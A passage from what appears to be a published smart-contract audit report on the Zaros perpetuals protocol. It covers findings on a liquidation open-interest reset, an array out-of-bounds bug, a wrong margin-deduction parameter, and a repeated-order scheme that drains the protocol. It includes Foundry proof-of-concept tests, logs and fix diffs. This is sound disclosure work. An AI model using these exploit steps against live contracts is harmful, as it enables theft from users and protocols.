  two open positions next funding fee per unit: -1.3020863147915e13
  
  @> skew and OI after one of the long positions being liquidated
  --------------------
  @> skew: 0e0
  @> longs open interest: 0e0
  shorts open interest: 0e0
 @>  total open interest: 0e0
  --------------------
  
  one open position mark price: 1.0000005e23
  one open position order fee in usd: 8.000004e20
  one open position funding rate x18: 6.249999998e9
  one open position next funding fee per unit: -2.62239716177708e15

Suite result: FAILED. 1 passed; 1 failed; 0 skipped; finished in 17.72ms (13.20ms CPU time)

Ran 1 test suite in 123.60ms (17.72ms CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)

Failing tests:
Encountered 1 failing test in test/integration/perpetuals/liquidation-branch/liquidateAccounts/liquidateAccounts.t.sol:LiquidateAccounts_Integration_Test
@> [FAIL. Reason: panic: arithmetic underflow or overflow (0x11)] testGiveOneAccountIsLiquidated_systemWillSetIncorrectValueForSkewAndInterest_causingDoS_whenUserTryToUpdateHisPosition() (gas: 13239744)
```

## Impact

* DoS - Position updates halted due to arithmetic underflow.
* Market metrics/calculation disrupted: Disrupted skew and open interest calculations impact the core financial metrics like `fundingRate`, `fundingFeePerUnit`, `markPrice`, `getAccruedFunding` and `getOrderFeeUsd`.
* Users from that market will lose their interest.
* Users not originally at risk may face liquidation due to loss of earnings and interests.

## Tools Used

Manual Review & Foundry

## Recommendations

Update `skew` and `OI` by deducting only the liquidated position. This clears the impact of liquidated positions from open interest and skew without resetting them to zero or causing reverts. 

Add the following function to `PerpMarket.sol`

```diff
+ /// @notice Clears out liquidation open interest state for the given market.
+    function updateOpenInterestLiquidation(Data storage self, SD59x18 oldPositionSize) internal {
+        UD60x18 currentOpenInterest = ud60x18(self.openInterest);
+        SD59x18 currentSkew = sd59x18(self.skew);
+        self.openInterest = currentOpenInterest.sub(oldPositionSize.abs().intoUD60x18()).intoUint128();
+        self.skew = currentSkew.sub(oldPositionSize).intoInt256().toInt128();
+    }
```

Now on the `liquidateAccounts` function, replace the call to `updateOpenInterest` with the function above.

```diff
- perpMarket.updateOpenInterest(ctx.newOpenInterestX18, ctx.newSkewX18);
+ perpMarket.updateOpenInterestLiquidation(ctx.oldPositionSizeX18);
```

Run the PoC again, but this time comment out calls to `_assertSkewAndOIasZero()`.

✅ Result: No DoS and the skew/OI values are adjusted correctly.

```JavaScript
--------------------
  skew: 0e0
  longs open interest: 0e0
  shorts open interest: 0e0
  total open interest: 0e0
  --------------------
  
  skew and OI after the first long position being opened
  --------------------
  skew: 1e19
  longs open interest: 1e19
  shorts open interest: 0e0
  total open interest: 1e19
  --------------------
  
  one open position mark price: 1.0000015e23
  one open position order fee in usd: 8.000012e20
  one open position funding rate x18: 1.249999999e9
  one open position next funding fee per unit: -2.604170506249e12
  
  skew and OI after the second long position being opened
  --------------------
  skew: 2e19
  longs open interest: 2e19
  shorts open interest: 0e0
  total open interest: 2e19
  --------------------
  
  two open positions mark price: 1.0000025e23
  two open positions order fee in usd: 8.00002e20
  two open positions funding rate x18: 3.749999998e9
  two open positions next funding fee per unit: -1.3020863147915e13
  
  skew and OI after one of the long positions being liquidated
  --------------------
  @> skew: 1e19
  @> longs open interest: 1e19
  shorts open interest: 0e0
  @> total open interest: 1e19
  --------------------
  
  one open position mark price: 1.0000015e23
  one open position order fee in usd: 8.000012e20
  one open position funding rate x18: 1.31249999997e11
  one open position next funding fee per unit: -2.8664105494643746e16
  @> Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 17.90ms (13.86ms CPU time)
```

## <a id='H-06'></a>H-06. `LiquidationBranch::checkLiquidatableAccounts()` executes `for` loop with wrong values, causing array out of bounds to be recovered, the program will not work as expected

_Submitted by [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [pianist](https://profiles.cyfrin.io/u/pianist), [petersr](https://profiles.cyfrin.io/u/petersr), [T1MOH](https://profiles.cyfrin.io/u/T1MOH), [bauchibred](https://profiles.cyfrin.io/u/bauchibred), [danielarmstrong](https://profiles.cyfrin.io/u/danielarmstrong), [meeve](https://profiles.cyfrin.io/u/meeve), [pelz](https://profiles.cyfrin.io/u/pelz), [Reentrants](https://codehawks.cyfrin.io/team/cly3oauyy000d26pej6o3uazr), [josh4324](https://profiles.cyfrin.io/u/josh4324), [baz1ka](https://profiles.cyfrin.io/u/baz1ka), [bladesec](https://profiles.cyfrin.io/u/bladesec), [draiakoo](https://profiles.cyfrin.io/u/draiakoo), [0xleadwizard](https://profiles.cyfrin.io/u/0xleadwizard), [infect3d](https://profiles.cyfrin.io/u/infect3d), [0xd4n13l](https://profiles.cyfrin.io/u/0xd4n13l), [emma77](https://profiles.cyfrin.io/u/emma77), [cryptedoji](https://profiles.cyfrin.io/u/cryptedoji), [0xshoonya](https://profiles.cyfrin.io/u/0xshoonya), [frontrunner](https://profiles.cyfrin.io/u/frontrunner). Selected submission by: [joicygiore](https://profiles.cyfrin.io/u/joicygiore)._      
            


## Summary

1. `LiquidationBranch::checkLiquidatableAccounts()` executes `for` loop with wrong values, causing array out of bounds to be recovered, the program will not work as expected
2. Even if the liquidation conditions are not met, the array will still store objects with a value of 0, which will affect the execution logic in `LiquidationKeeper::checkUpkeep()`

## Vulnerability Details

```js
    // LiquidationBranch::checkLiquidatableAccounts() 
    /// @param lowerBound The lower bound of the accounts to check
    /// @param upperBound The upper bound of the accounts to check
    function checkLiquidatableAccounts(
        uint256 lowerBound,
        uint256 upperBound
    )
        external
        view
        returns (uint128[] memory liquidatableAccountsIds)
    {
        // prepare output array size
@>        liquidatableAccountsIds = new uint128[](upperBound - lowerBound);


        // return if nothing to process
        if (liquidatableAccountsIds.length == 0) return liquidatableAccountsIds;


        // fetch storage slot for global config
        GlobalConfiguration.Data storage globalConfiguration = GlobalConfiguration.load();


        // cache active account ids length
        uint256 cachedAccountsIdsWithActivePositionsLength =
            globalConfiguration.accountsIdsWithActivePositions.length();


        // iterate over active accounts within given bounds
@>        for (uint256 i = lowerBound; i < upperBound; i++) {
            // break if `i` greater then length of active account ids
            if (i >= cachedAccountsIdsWithActivePositionsLength) break;


            // get the `tradingAccountId` of the current active account
            uint128 tradingAccountId = uint128(globalConfiguration.accountsIdsWithActivePositions.at(i));


            // load that account's leaf (data + functions)
            TradingAccount.Data storage tradingAccount = TradingAccount.loadExisting(tradingAccountId);


            // get that account's required maintenance margin & unrealized PNL
            (, UD60x18 requiredMaintenanceMarginUsdX18, SD59x18 accountTotalUnrealizedPnlUsdX18) =
                tradingAccount.getAccountMarginRequirementUsdAndUnrealizedPnlUsd(0, SD59x18_ZERO);


            // get that account's current margin balance
            SD59x18 marginBalanceUsdX18 = tradingAccount.getMarginBalanceUsd(accountTotalUnrealizedPnlUsdX18);


            // account can be liquidated if requiredMargin > marginBalance
            if (TradingAccount.isLiquidatable(requiredMaintenanceMarginUsdX18, marginBalanceUsdX18)) {
@>                liquidatableAccountsIds[i] = tradingAccountId;
            }
        }
    }
```

The length of the `liquidatableAccountsIds` array is `upperBound - lowerBound`, and this method can be used for segmented checking. But the starting value of the for loop is `uint256 i = lowerBound`. If `lowerBound != 0`, it is easy to recover due to array out of bounds.

Let's assume a scenario:

```js
upperBound = 10;
lowerBound = 20;
liquidatableAccountsIds = new uint128[](10);
for (uint256 i = lowerBound; i < upperBound; i++) {}
```

At this time, the maximum index of `liquidatableAccountsIds` is 9, but `i = 10` in the first for loop, when the program executes to `liquidatableAccountsIds[10] = tradingAccountId;`, it will recover due to overflow.
And this method is called by `LiquidationKeeper::checkUpkeep()`, where different operations are performed according to the length of the array returned by `LiquidationBranch::checkLiquidatableAccounts()` (the code snippet is as follows).

```js
    // LiquidationKeeper::checkUpkeep()
 @>       uint128[] memory liquidatableAccountsIds =
            perpsEngine.checkLiquidatableAccounts(checkLowerBound, checkUpperBound);
        uint128[] memory accountsToBeLiquidated;


 @>       if (liquidatableAccountsIds.length == 0 || liquidatableAccountsIds.length <= performLowerBound) {
            performData = abi.encode(accountsToBeLiquidated);


            return (upkeepNeeded, performData);
        }
```

However, due to the existence of the following code in `LiquidationBranch::checkLiquidatableAccounts()`, even if the conditions are not met, `liquidatableAccountsIds[i]` will default to 0. So we also need to clean up the objects with 0 in the `liquidationAccountsIds` array.

```js
    // LiquidationBranch::checkLiquidatableAccounts()
            if (TradingAccount.isLiquidatable(requiredMaintenanceMarginUsdX18, marginBalanceUsdX18)) {
@>               liquidatableAccountsIds[i] = tradingAccountId;
            }
```

### Poc

Please add the test code to `test/integration/perpetuals/liquidation-branch/checkLiquidatableAccounts/checkLiquidatableAccounts.t.sol` and execute

```js
    function test_checkLiquidatableAccounts_error() public {
        MarketConfig memory fuzzMarketConfig = getFuzzMarketConfig(1);  
        uint256 amountOfTradingAccounts = 30;
        uint256 marginValueUsd = 10_000e18 * 3 / amountOfTradingAccounts;
        uint256 initialMarginRate = fuzzMarketConfig.imr;
        bool isLong = true;
        deal({ token: address(usdz), to: users.naruto.account, give: marginValueUsd });

        for (uint256 i; i < amountOfTradingAccounts; i++) {
            uint256 accountMarginValueUsd = marginValueUsd / amountOfTradingAccounts;

            uint128 tradingAccountId = createAccountAndDeposit(accountMarginValueUsd, address(usdz));

            openPosition(fuzzMarketConfig, tradingAccountId, initialMarginRate, accountMarginValueUsd, isLong);
        }
        setAccountsAsLiquidatable(fuzzMarketConfig, isLong);
        uint256 lowerBound = 10;
        uint256 upperBound = 20;
        vm.expectRevert(abi.encodeWithSignature("Panic(uint256)", 0x32)); // panic: array out-of-bounds access (0x32)
        perpsEngine.checkLiquidatableAccounts(lowerBound, upperBound);
    }
    // Ran 1 test for test/integration/perpetuals/liquidation-branch/checkLiquidatableAccounts/checkLiquidatableAccounts.t.sol:CheckLiquidatableAccounts_Integration_Test
    // [PASS] test_checkLiquidatableAccounts_error() (gas: 20435116)
```

### Code Snippet

<https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/branches/LiquidationBranch.sol#L40-L86>
<https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/external/chainlink/keepers/liquidation/LiquidationKeeper.sol#L44-L88>

## Impact

`LiquidationBranch::checkLiquidatableAccounts()` executes `for` loop with wrong values, causing array out of bounds to be recovered, the program will not work as expected

## Tools Used

Manual Review

## Recommendations

1. Fix the revert caused by out-of-bounds i value in for loop
2. Clean up objects with value 0 in the `liquidatableAccountsIds` array

For example:

```diff
    /// @param lowerBound The lower bound of the accounts to check
    /// @param upperBound The upper bound of the accounts to check
    function checkLiquidatableAccounts(
        uint256 lowerBound,
        uint256 upperBound
    )
        external
        view
        returns (uint128[] memory liquidatableAccountsIds)
    {
        // prepare output array size
-        liquidatableAccountsIds = new uint128[](upperBound - lowerBound);
+        uint128[] memory cacheLiquidatableAccountsIds = new uint128[](upperBound - lowerBound);

        // return if nothing to process
-        if (liquidatableAccountsIds.length == 0) return liquidatableAccountsIds;
+        if (cacheLiquidatableAccountsIds.length == 0) return liquidatableAccountsIds;

        // fetch storage slot for global config
        GlobalConfiguration.Data storage globalConfiguration = GlobalConfiguration.load();


        // cache active account ids length
        uint256 cachedAccountsIdsWithActivePositionsLength =
            globalConfiguration.accountsIdsWithActivePositions.length();

+       uint256 count = 0; // Initialize count to keep track of valid entries
        // iterate over active accounts within given bounds
        for (uint256 i = lowerBound; i < upperBound; i++) {
            // break if `i` greater then length of active account ids
            if (i >= cachedAccountsIdsWithActivePositionsLength) break;


            // get the `tradingAccountId` of the current active account
            uint128 tradingAccountId = uint128(globalConfiguration.accountsIdsWithActivePositions.at(i));


            // load that account's leaf (data + functions)
            TradingAccount.Data storage tradingAccount = TradingAccount.loadExisting(tradingAccountId);


            // get that account's required maintenance margin & unrealized PNL
            (, UD60x18 requiredMaintenanceMarginUsdX18, SD59x18 accountTotalUnrealizedPnlUsdX18) =
                tradingAccount.getAccountMarginRequirementUsdAndUnrealizedPnlUsd(0, SD59x18_ZERO);


            // get that account's current margin balance
            SD59x18 marginBalanceUsdX18 = tradingAccount.getMarginBalanceUsd(accountTotalUnrealizedPnlUsdX18);


            // account can be liquidated if requiredMargin > marginBalance
            if (TradingAccount.isLiquidatable(requiredMaintenanceMarginUsdX18, marginBalanceUsdX18)) {
-                liquidatableAccountsIds[i] = tradingAccountId;
+                cacheLiquidatableAccountsIds[count] = tradingAccountId; // Use count as the index
+                count++; // Increment count for next valid entry
            }
        }
+        // Resize the array to remove trailing zeroes
+        liquidatableAccountsIds = new uint128[](count);
+        for (uint256 j = 0; j < count; j++) {
+            liquidatableAccountsIds[j] = cacheLiquidatableAccountsIds[j];   
+        }    
    }
```

test again,it's work.

## <a id='H-07'></a>H-07. Wrong parameter passed in `TradingAccount::deductAccountMargin` function that results in excess margin withdrawal

_Submitted by [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [qpzm](https://profiles.cyfrin.io/u/qpzm), [0xe4669da](https://profiles.cyfrin.io/u/0xe4669da), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [whitehat777](https://profiles.cyfrin.io/u/whitehat777), [giraffe0x](https://profiles.cyfrin.io/u/giraffe0x), [0xstalin](https://profiles.cyfrin.io/u/0xstalin), [sohrabhind](https://profiles.cyfrin.io/u/sohrabhind), [fyamf](https://profiles.cyfrin.io/u/fyamf), [s3v3ru5](https://profiles.cyfrin.io/u/s3v3ru5), [nisedo](https://profiles.cyfrin.io/u/nisedo), [0xlandlady](https://profiles.cyfrin.io/u/0xlandlady), [danielarmstrong](https://profiles.cyfrin.io/u/danielarmstrong), [0xrststn](https://profiles.cyfrin.io/u/0xrststn). Selected submission by: [0xe4669da](https://profiles.cyfrin.io/u/0xe4669da)._      
            


## Summary

In `LiquidationBranch::liquidateAccounts` function, wrong parameter value for `pnlUsdX18` passed in `TradingAccount::deductAccountMargin` function resulting in inflated `marginBalanceUsdX18` and wrong tokens transfer

## Vulnerability Details

When a liquidation is executed, in `LiquidationBranch::liquidateAccounts` function, `TradingAccount::deductAccountMargin` function is called. This function takes a parameter `pnlUsdX18` and uses this to adjust the margin balance with any unrealized PnL for the trading account that is being liquidated.

In [LiquidationBranch.sol#L158](https://github.com/Cyfrin/2024-07-zaros/blob/d687fe96bb7ace8652778797052a38763fbcbb1b/src/perpetuals/branches/LiquidationBranch.sol#L158) `requiredMaintenanceMarginUsdX18` is passed as argument for `pnlUsdX18` instead of passing `accountTotalUnrealizedPnlUsdX18`.

```solidity

function liquidateAccounts(uint128[] calldata accountsIds) external {
    
    ....
    
    ctx.liquidatedCollateralUsdX18 = tradingAccount.deductAccountMargin({
        feeRecipients: FeeRecipients.Data({
            marginCollateralRecipient: globalConfiguration.marginCollateralRecipient,
            orderFeeRecipient: address(0),
            settlementFeeRecipient: globalConfiguration.liquidationFeeRecipient
        }),
@>      pnlUsdX18: requiredMaintenanceMarginUsdX18,
        orderFeeUsdX18: UD60x18_ZERO,
        settlementFeeUsdX18: ctx.liquidationFeeUsdX18
    });

    ....
}

```

## Impact

As a result, in `TradingAccount::withdrawMarginUsd` function, less tokens are transferred to `marginCollateralRecipient` and with the same amount `marginBalanceUsdX18` of the liquidated account is inflated. Eventually the owner of the trading account can withdraw this excess margin.

For demonstration purpose, if a trader opens a long position using 75,000 USDz, then upon liquidation he can receive 7,102 USDz as excess margin added to his account which he can withdraw and also 7,102 USDz less transferred to the `marginCollateralRecipient`.

Below is a coded Proof of Concept.

## POC

In `test/integration/perpetuals/liquidation-branch/liquidateAccounts/liquidateAccounts.t.sol` add below code. Run the test `forge test --mt test_inLiquidationWrongTokenAmountTransferWrongMarginBalance -vv`

```diff
++ import { TradingAccount } from "@zaros/perpetuals/leaves/TradingAccount.sol";
++ import { MockPriceFeed } from "test/mocks/MockPriceFeed.sol";
++ import {console} from "forge-std/console.sol";
++ import { IERC20 } from "@openzeppelin/token/ERC20/ERC20.sol";

++ function test_inLiquidationWrongTokenAmountTransferWrongMarginBalance()
++        external
++        givenTheSenderIsARegisteredLiquidator
++        whenTheAccountsIdsArrayIsNotEmpty
++        givenAllAccountsExist
++    {
++        
++        TestFuzz_GivenThereAreLiquidatableAccountsInTheArray_Context memory ctx;
++        ctx.fuzzMarketConfig = getFuzzMarketConfig(INITIAL_MARKET_ID);
++        vm.assume(ctx.fuzzMarketConfig.marketId != ctx.secondMarketConfig.marketId);
++
++        uint256 amountOfTradingAccounts = 1;
++        uint256 timeDelta = 1 days;
++        bool isLong = true;
++
++        ctx.marginValueUsd = 150_000e18 / amountOfTradingAccounts;
++        ctx.initialMarginRate = ctx.fuzzMarketConfig.imr;
++        deal({ token: address(usdz), to: users.naruto.account, give: ctx.marginValueUsd });
++        ctx.accountsIds = new uint128[](amountOfTradingAccounts + 2);
++        ctx.accountMarginValueUsd = ctx.marginValueUsd / (amountOfTradingAccounts + 1);
++
++        for (uint256 i; i < amountOfTradingAccounts; i++) {
++            ctx.tradingAccountId = createAccountAndDeposit(ctx.accountMarginValueUsd, address(usdz));
++
++            console.log(" ");
++            console.log("AFTER ACCOUNT CREATION AND DEPOSIT");
++            console.log("----------------------------------");
++            _wyLogUpnl(ctx.tradingAccountId);
++            _wyLogMarginInfo(ctx.tradingAccountId);
++
++            openPosition(
++                ctx.fuzzMarketConfig,
++                ctx.tradingAccountId,
++                ctx.initialMarginRate,
++                ctx.accountMarginValueUsd,
++                isLong
++            );
++
++            ctx.accountsIds[i] = ctx.tradingAccountId;
++            deal({ token: address(usdz), to: users.naruto.account, give: ctx.marginValueUsd });
++        }
++        
++        uint256 indexPrice = getPrice(
++            MockPriceFeed(marketsConfig[ctx.fuzzMarketConfig.marketId].priceAdapter)
++        ).intoUint256();
++
++        console.log(" ");
++        console.log("AFTER CREATING POSITION");
++        console.log("-----------------------");
++        console.log("indexPrice: ", indexPrice / 1e18);
++        _wyLogUpnl(ctx.accountsIds[0]);
++        _wyLogMarginInfo(ctx.accountsIds[0]);
++
++        setAccountsAsLiquidatable(ctx.fuzzMarketConfig, isLong);
++
++        indexPrice = getPrice(
++            MockPriceFeed(marketsConfig[ctx.fuzzMarketConfig.marketId].priceAdapter)).intoUint256();
++
++        console.log(" ");
++        console.log("AFTER SETTING POSITION LIQUIDATABLE");
++        console.log("-----------------------------------");
++        console.log("indexPrice: ", indexPrice / 1e18);
++        _wyLogUpnl(ctx.accountsIds[0]);
++        _wyLogMarginInfo(ctx.accountsIds[0]);
++
++        ctx.nonLiquidatableTradingAccountId = createAccountAndDeposit(ctx.accountMarginValueUsd, address(usdz));
++        ctx.accountsIds[amountOfTradingAccounts] = ctx.nonLiquidatableTradingAccountId;
++
++        changePrank({ msgSender: liquidationKeeper });
++        skip(timeDelta);
++
++        ctx.expectedLastFundingRate = perpsEngine.getFundingRate(ctx.fuzzMarketConfig.marketId).intoInt256();
++        ctx.expectedLastFundingTime = block.timestamp;
++
++        perpsEngine.liquidateAccounts(ctx.accountsIds);
++        
++        indexPrice = getPrice(
++            MockPriceFeed(marketsConfig[ctx.fuzzMarketConfig.marketId].priceAdapter)).intoUint256();
++        
++        console.log(" ");
++        console.log("AFTER LIQUIDATION BEFORE MARGIN WITHDRAWAL");
++        console.log("------------------------------------------");
++        console.log("indexPrice: ", indexPrice / 1e18);
++        _wyLogUpnl(ctx.accountsIds[0]);
++        _wyLogMarginInfo(ctx.accountsIds[0]);
++
++        UD60x18 finalAvailableMargin = perpsEngine.getAccountMarginCollateralBalance(ctx.accountsIds[0], address(usdz));
++
++        console.log('USDZ balance of trader', IERC20(address(usdz)).balanceOf(users.naruto.account) / 1e18);
++        
++        changePrank({ msgSender: users.naruto.account });
++
++        perpsEngine.withdrawMargin(ctx.accountsIds[0], address(usdz), finalAvailableMargin.intoUint256());
++
++        console.log(" ");
++        console.log("AFTER MARGIN WITHDRAWAL");
++        console.log("-----------------------");
++        _wyLogUpnl(ctx.accountsIds[0]);
++        _wyLogMarginInfo(ctx.accountsIds[0]);
++        console.log('USDZ balance of trader', IERC20(address(usdz)).balanceOf(users.naruto.account) / 1e18);
++
++    }
++
++    function _wyLogMarginInfo(uint128 _accountsId) internal view {
++        
++        (
++            SD59x18 marginBalanceUsdX18,
++            UD60x18 initialMarginUsdX18,
++            UD60x18 maintenanceMarginUsdX18,
++            SD59x18 availableMarginUsdX18
++        ) = perpsEngine.getAccountMarginBreakdown(_accountsId);
++
++        console.log("marginBalanceUsdX18: ",marginBalanceUsdX18.intoInt256() / 1e18);
++        console.log("initialMarginUsdX18: ",initialMarginUsdX18.intoUint256() / 1e18);
++        console.log("maintenanceMarginUsdX18: ",maintenanceMarginUsdX18.intoUint256() / 1e18);
++        console.log("availableMarginUsdX18: ",availableMarginUsdX18.intoInt256() / 1e18);
++    }
++
++    function _wyLogUpnl(uint128 _accountsId) internal view {
++        SD59x18 accountTotalUnrealizedPnlUsdX18Before = perpsEngine.getAccountTotalUnrealizedPnl(_accountsId);
++        console.log("accountTotalUnrealizedPnlUsdX18: ", accountTotalUnrealizedPnlUsdX18Before.intoInt256() / 1e18);
++    }

```

```bash

Ran 1 test for test/integration/perpetuals/liquidation-branch/liquidateAccounts/liquidateAccounts.t.sol:LiquidateAccounts_Integration_Test
[PASS] test_inLiquidationWrongTokenAmountTransferWrongMarginBalance() (gas: 1819897)
Logs:
  AFTER ACCOUNT CREATION AND DEPOSIT
  ----------------------------------
  accountTotalUnrealizedPnlUsdX18:  0
  marginBalanceUsdX18:  75000
  initialMarginUsdX18:  0
  maintenanceMarginUsdX18:  0
  availableMarginUsdX18:  75000
  ctx.pnlDeductedUsdX18:  0
   
  AFTER CREATING POSITION
  -----------------------
  indexPrice:  100000
  accountTotalUnrealizedPnlUsdX18:  0
  marginBalanceUsdX18:  69478
  initialMarginUsdX18:  68997
  maintenanceMarginUsdX18:  34498
  availableMarginUsdX18:  480
   
  AFTER SETTING POSITION LIQUIDATABLE
  -----------------------------------
  indexPrice:  99400
  accountTotalUnrealizedPnlUsdX18:  -41398
  marginBalanceUsdX18:  28079
  initialMarginUsdX18:  68583
  maintenanceMarginUsdX18:  34291
  availableMarginUsdX18:  -40504
   
  LIQUIDATION IN PROCESS
  ----------------------
  marginCollateralBalanceX18:  69473
  requiredMarginInCollateralX18:  34291
  ctx.pnlDeductedUsdX18:  34291
  ctx.liquidqationFeeUsd18 5
  ctx.liquidatedCollateralUsdX18 34296
   
  AFTER LIQUIDATION BEFORE MARGIN WITHDRAWAL
  ------------------------------------------
  indexPrice:  99400
  accountTotalUnrealizedPnlUsdX18:  0
  marginBalanceUsdX18:  35181
  initialMarginUsdX18:  0
  maintenanceMarginUsdX18:  0
  availableMarginUsdX18:  35181
  USDZ balance of trader 75000
   
  AFTER MARGIN WITHDRAWAL
  -----------------------
  accountTotalUnrealizedPnlUsdX18:  0
  marginBalanceUsdX18:  0
  initialMarginUsdX18:  0
  maintenanceMarginUsdX18:  0
  availableMarginUsdX18:  0
  USDZ balance of trader 110181

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 16.97ms (2.87ms CPU time)
```

After creating the position `marginBalanceUsdX18` was 69,478, after setting the position as liquidatable the `marginBalanceUsdX18` fell to 28,079 because of unrealized loss of 41,398 but after liquidation `marginBalanceUsdX18` increased to 35,181 with a differential of 7,102 and later the excess margin is withrawn by the trading account owner.

## Tools Used

Manual review

## Recommendations

In `TradingAccount::deductAccountMargin` function, absolute value of `accountTotalUnrealizedPnlUsdX18` with `UD60x18` type conversion should be passed as argument for `pnlUsdX18`.

```diff
function liquidateAccounts(uint128[] calldata accountsIds) external {
    
    ....
    
    ctx.liquidatedCollateralUsdX18 = tradingAccount.deductAccountMargin({
        feeRecipients: FeeRecipients.Data({
            marginCollateralRecipient: globalConfiguration.marginCollateralRecipient,
            orderFeeRecipient: address(0),
            settlementFeeRecipient: globalConfiguration.liquidationFeeRecipient
        }),
--      pnlUsdX18: requiredMaintenanceMarginUsdX18,
++      pnlUsdX18: accountTotalUnrealizedPnlUsdX18.abs().intoUD60x18()
        orderFeeUsdX18: UD60x18_ZERO,
        settlementFeeUsdX18: ctx.liquidationFeeUsdX18
    });

    ....
}
```

```bash
Ran 1 test for test/integration/perpetuals/liquidation-branch/liquidateAccounts/liquidateAccounts.t.sol:LiquidateAccounts_Integration_Test
[PASS] test_inLiquidationWrongTokenAmountTransferWrongMarginBalance() (gas: 1820081)
Logs:
  AFTER ACCOUNT CREATION AND DEPOSIT
  ----------------------------------
  accountTotalUnrealizedPnlUsdX18:  0
  marginBalanceUsdX18:  75000
  initialMarginUsdX18:  0
  maintenanceMarginUsdX18:  0
  availableMarginUsdX18:  75000
  ctx.pnlDeductedUsdX18:  0
   
  AFTER CREATING POSITION
  -----------------------
  indexPrice:  100000
  accountTotalUnrealizedPnlUsdX18:  0
  marginBalanceUsdX18:  69478
  initialMarginUsdX18:  68997
  maintenanceMarginUsdX18:  34498
  availableMarginUsdX18:  480
   
  AFTER SETTING POSITION LIQUIDATABLE
  -----------------------------------
  indexPrice:  99400
  accountTotalUnrealizedPnlUsdX18:  -41398
  marginBalanceUsdX18:  28079
  initialMarginUsdX18:  68583
  maintenanceMarginUsdX18:  34291
  availableMarginUsdX18:  -40504
   
  LIQUIDATION IN PROCESS
  ----------------------
  marginCollateralBalanceX18:  69473
  requiredMarginInCollateralX18:  41399
  ctx.pnlDeductedUsdX18:  41399
  ctx.liquidqationFeeUsd18 5
  ctx.liquidatedCollateralUsdX18 41404
   
  AFTER LIQUIDATION BEFORE MARGIN WITHDRAWAL
  ------------------------------------------
  indexPrice:  99400
  accountTotalUnrealizedPnlUsdX18:  0
  marginBalanceUsdX18:  28073
  initialMarginUsdX18:  0
  maintenanceMarginUsdX18:  0
  availableMarginUsdX18:  28073
  USDZ balance of trader 75000
   
  AFTER MARGIN WITHDRAWAL
  -----------------------
  accountTotalUnrealizedPnlUsdX18:  0
  marginBalanceUsdX18:  0
  initialMarginUsdX18:  0
  maintenanceMarginUsdX18:  0
  availableMarginUsdX18:  0
  USDZ balance of trader 103073
```

As you can see, the only difference in the `marginBalanceUsdX18` should be the deduction of `liquidqationFeeUsd18`.

## <a id='H-08'></a>H-08. Draining the protocol fully

_Submitted by [fyamf](https://profiles.cyfrin.io/u/fyamf), [aamirusmani1552](https://profiles.cyfrin.io/u/aamirusmani1552). Selected submission by: [fyamf](https://profiles.cyfrin.io/u/fyamf)._      
            


## Summary

* Attacker deposits a large collateral, and creates an order with large size delta. Later, it fills.
* Then, the attacker creates second order, and later it fills.
* The second order will increase the mark price, so the old position will gain large unrealized profit. This profit will be added to the collateral balance, and makes the margin balance larger.
* Now that the margin balance is larger (thanks to the unrealized profit), it allows creating another order again.
* The attacker repeats this, until reaching to the maximum allowed open interest.
* Now the attacker has a huge collateral balance and position size.
* Now the attacker's account is liquidatable.
* After it is liquidated, huge amount of fund will be remained as collateral in the attacker's account.
* Attacker can now easily withdraw them.
  <https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/branches/SettlementBranch.sol#L435>
  <https://github.com/Cyfrin/2024-07-zaros/blob/main/src/perpetuals/leaves/TradingAccount.sol#L200>

## Vulnerability Details

The following scenario is implemented in the PoC. It can be verified easily by running the PoC.

* Attacker deposits 1\_000\_000 USDz as collateral in ETH market where its index price is 1000\$.
* Attack creates a long position order with size 92\_000.
* This order will be filled at mark price 1004.6\$.
* The attacker creates another long position order with size 60\_000. It is expected that it reverts because very simply the final position size would be 152\_000 each with minimum price of 1000\$. So, the final position value would be `152_000 * 1000 = 152M`, and its required inital margin would be `0.01 * 152M = 1.52M`, while the collateral worths only 1M, which is less than the initial required margin.
* But the protocol is implemented differently, and this order will be filled successfully. Because, when the new order 60\_000 is created, the mark price will increase to 1012.2  (this is because the skew increases). Then, the unrealized profit associated to the old position will be added to the collateral which is equal to `92_000 * (1012.2 - 1004.6) = 699_200$`, so the collateral would be equal to `1_000_000 + 699_200 = 1.699M` by ignoring the fees for simplicity (the PoC demonstrates the real case). It can be seen that since collateral is higher than initial required margin `1.52M`, it allows the order to be created and later filled.
* Now, the attacker has a long position with size 152\_000, while the original collateral was 1M.
* The attacker repeats this scenario again. I.e. he again creates another long position order with size 60\_000, and it later be filled. He repeats this until it reaches to the `maxOpenInterest` (maximum profit of the attacker is when reaching to this limit, that is why some iterations are done. Without any iteration, the attacker would steal less fund). The PoC shows that 15 iterations are enough to reach to this limit. The following table shows each step in real case (including fees).

```Solidity
                        sizeDelta       markPrice       newSkew     marginCollateralBalance  
befor order creation    0               1000            0           1_000_000                    
first order             92k             1004.6          92k         926_059
iteration 1             60k             1012.2          152k        1_576_671    
iteration 2             60k             1018.2          212k        2_439_796         
iteration 3             60k             1024.2          272k        3_662_632 
iteration 4             60k             1030.2          332k        5_245_180
iteration 5             60k             1036.2          392k        7_187_441
iteration 6             60k             1042.2          452k        9_489_413
iteration 7             60k             1048.2          512k        12_151_097
iteration 8             60k             1054.2          572k        15_172_494
iteration 9             60k             1060.2          632k        18_553_602
iteration 10            60k             1066.2          692k        22_294_422 
iteration 11            60k             1072.2          752k        26_394_954
iteration 12            60k             1078.2          812k        30_855_198
iteration 13            60k             1084.2          872k        35_675_153
iteration 14            60k             1090.2          932k        40_854_821
iteration 15            60k             1096.2          992k        46_394_200                                                                              
```

* The table shows that after the final order being filled, the  `marginCollateralBalance` is equal to `46_394_200`. For sure this account is liquidatable because the `requiredMaintenanceMarginUsdX18` is equal to `992k * 1049.6 * 0.005 = 5_206_016` (where 1049.6 is the mark price when closing the entire position). While the `marginBalanceUsdX18` is just equal to `46_394_200 - (1096.2 - 1049.6) * 992k = 167_000`.
